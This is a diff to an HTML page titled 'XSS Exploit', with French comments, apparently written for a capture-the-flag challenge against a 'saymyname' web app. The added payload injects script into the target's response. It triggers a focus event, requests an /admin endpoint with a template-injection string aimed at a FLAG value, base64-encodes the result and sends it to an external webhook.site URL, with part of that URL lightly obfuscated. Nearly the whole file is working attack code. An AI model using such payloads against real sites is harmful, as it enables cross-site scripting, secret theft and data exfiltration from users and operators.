@@ -3,8 +3,7 @@
 <head><title>XSS Exploit</title></head>
 <body>
 <script>
-  // Payload qui déclenche automatiquement l'événement focus
-  const xssPayload = 'x`;document.getElementById("behindthename-redirect").focus();//';
+  const xssPayload = 'x`;document.getElementById(`behindthename-redirect`).focus();fetch(`/admin?prompt={run_cmd.__globals__[FLAG]}`).then(r=>r.text()).then(d=>fetch(`https${String.fromCharCode(58)}//webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?d=${btoa(d)}`));//';
   
   fetch('https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/your-name', {
     method: 'POST',
@@ -13,15 +12,21 @@
   })
   .then(response => response.text())
   .then(html => {
-    // Afficher la réponse dans un iframe pour exécuter l'XSS
+    // Créer un iframe pour exécuter le HTML avec l'XSS
     const iframe = document.createElement('iframe');
     iframe.srcdoc = html;
     document.body.appendChild(iframe);
     
-    // Mettre à jour le statut
-    document.getElementById('status').textContent = "Exploitation en cours...";
+    // Après chargement de l'iframe, forcer le focus
+    iframe.onload = function() {
+      try {
+        iframe.contentWindow.document.getElementById('behindthename-redirect').focus();
+      } catch(e) {
+        console.error("Erreur:", e);
+      }
+    };
   });
 </script>
-<h1 id="status">Chargemenet...</h1>
+<h1>Exploitation en cours...</h1>
 </body>
 </html>
